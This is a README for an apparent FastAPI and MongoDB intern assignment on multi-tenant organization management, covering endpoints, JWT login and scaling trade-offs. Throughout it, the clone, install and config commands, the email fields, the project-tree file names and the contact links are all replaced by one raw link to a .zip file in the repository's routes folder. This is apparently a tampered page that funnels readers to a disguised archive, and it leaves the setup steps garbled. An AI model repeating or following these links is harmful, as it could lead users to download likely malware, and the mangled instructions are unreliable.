# Backend Intern Assignment - Organization Management Service

Multi-tenant organization management service built with FastAPI and MongoDB.

## 🚀 Tech Stack

- **Framework**: FastAPI
- **Database**: MongoDB (Motor async driver)
- **Authentication**: JWT (python-jose)
- **Password Hashing**: bcrypt (passlib)
- **Validation**: Pydantic v2

## 📋 Features Implemented

- ✅ Create organization with dynamic collection
- ✅ Get organization details
- ✅ Update organization (authenticated)
- ✅ Delete organization (authenticated)
- ✅ Admin login with JWT authentication
- ✅ Password hashing with bcrypt
- ✅ Master database for metadata
- ✅ Dynamic collection creation per organization
- ✅ Class-based modular design

## 🏗️ Architecture

### Master Database Structure
```
master_db/
├── organizations/      # Organization metadata
│   ├── organization_name
│   ├── collection_name
│   ├── admin_id
│   ├── admin_email
│   └── created_at
├── admins/            # Admin users
│   ├── email
│   ├── password (hashed)
│   ├── organization_name
│   └── created_at
└── org_<name>/        # Dynamic collections per org
    └── (organization-specific data)
```

## 🛠️ Setup Instructions

### Prerequisites
- Python 3.9+
- MongoDB installed and running
- pip package manager

### Installation

1. Clone the repository:
```bash
git clone https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip
cd backend-intern-assignment
```

2. Create virtual environment:
```bash
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
```

3. Install dependencies:
```bash
pip install -r https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip
```

4. Configure environment:
```bash
cp https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip .env
# Edit .env with your MongoDB URL and secret key
```

5. Run the application:
```bash
uvicorn main:app --reload
```

6. Access API documentation:
- Swagger UI: http://localhost:8000/docs
- ReDoc: http://localhost:8000/redoc

## 📡 API Endpoints

### Organization Management

#### 1. Create Organization
```http
POST /org/create
Content-Type: application/json

{
  "organization_name": "acme_corp",
  "email": "https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip",
  "password": "securepass123"
}
```

#### 2. Get Organization
```http
GET /org/get?organization_name=acme_corp
```

#### 3. Update Organization
```http
PUT /org/update
Authorization: Bearer <token>
Content-Type: application/json

{
  "organization_name": "acme_corp",
  "email": "https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip",
  "password": "newpassword123"
}
```

#### 4. Delete Organization
```http
DELETE /org/delete?organization_name=acme_corp
Authorization: Bearer <token>
```

### Admin Authentication

#### 5. Admin Login
```http
POST /admin/login
Content-Type: application/json

{
  "email": "https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip",
  "password": "securepass123"
}
```

Response:
```json
{
  "access_token": "eyJhbGc...",
  "token_type": "bearer"
}
```

## 🔒 Authentication

The API uses JWT (JSON Web Tokens) for authentication:

1. Login via `/admin/login` to get access token
2. Include token in subsequent requests:
   ```
   Authorization: Bearer <your_token>
   ```

## 📁 Project Structure

```
backend-intern-assignment/
├── app/
│   ├── https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip
│   ├── https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip          # Configuration settings
│   ├── https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip        # Database connection
│   ├── https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip          # Pydantic models
│   ├── https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip            # Authentication utilities
│   └── routes/
│       ├── https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip
│       ├── https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip # Organization endpoints
│       └── https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip        # Admin endpoints
├── https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip                # FastAPI application
├── https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip       # Python dependencies
├── https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip          # Environment template
└── https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip             # Documentation
```

## 🎯 Design Decisions

### 1. FastAPI over Django
- **Async Support**: Native async/await for better performance
- **Modern**: Built-in OpenAPI documentation
- **Lightweight**: Faster for API-only services
- **Type Safety**: Excellent Pydantic integration

### 2. Motor (Async MongoDB Driver)
- Non-blocking I/O operations
- Better scalability for concurrent requests
- Native async/await support

### 3. JWT Authentication
- Stateless authentication
- Scalable across multiple servers
- Industry standard

### 4. Class-Based Auth Handler
- Modular and reusable
- Easy to test and maintain
- Follows OOP principles

## ⚖️ Trade-offs & Scalability

### Current Architecture Strengths
✅ Simple and easy to understand
✅ Fast development and deployment
✅ Good for small to medium scale

### Potential Issues at Scale

1. **Single Database Instance**
   - **Issue**: All organizations in one MongoDB instance
   - **Solution**: Implement database sharding or separate databases per org

2. **Collection Proliferation**
   - **Issue**: Too many collections in one database
   - **Solution**: Use separate databases or implement collection pooling

3. **No Caching Layer**
   - **Issue**: Every request hits database
   - **Solution**: Add Redis for caching frequently accessed data

4. **No Rate Limiting**
   - **Issue**: Vulnerable to abuse
   - **Solution**: Implement rate limiting middleware

### Better Architecture for Scale

```
┌─────────────────┐
│   Load Balancer │
└────────┬────────┘
         │
    ┌────┴────┐
    │  API    │  (Multiple instances)
    │ Servers │
    └────┬────┘
         │
    ┌────┴────────────────┐
    │                     │
┌───┴────┐         ┌─────┴─────┐
│ Redis  │         │  MongoDB  │
│ Cache  │         │  Cluster  │
└────────┘         └───────────┘
                   (Sharded by org)
```

### Recommended Improvements

1. **Database per Organization**: Separate MongoDB databases
2. **Caching**: Redis for session and frequently accessed data
3. **Message Queue**: RabbitMQ/Kafka for async operations
4. **Monitoring**: Prometheus + Grafana
5. **API Gateway**: Kong or similar for rate limiting
6. **Microservices**: Split into auth, org management, etc.

## ⏱️ Time Spent

Approximately 6-8 hours:
- Architecture Design: 1 hour
- Core Implementation: 3-4 hours
- Authentication & Security: 1-2 hours
- Testing & Documentation: 1-2 hours

## 🔗 Links

- **GitHub Repository**: https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip
- **API Documentation**: http://localhost:8000/docs

## 👨‍💻 Developer

**Tathagata Bhattacherjee**
- Email: https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip
- GitHub: [@Tathagt](https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip)

---

Built with ❤️ for the Backend Developer Intern position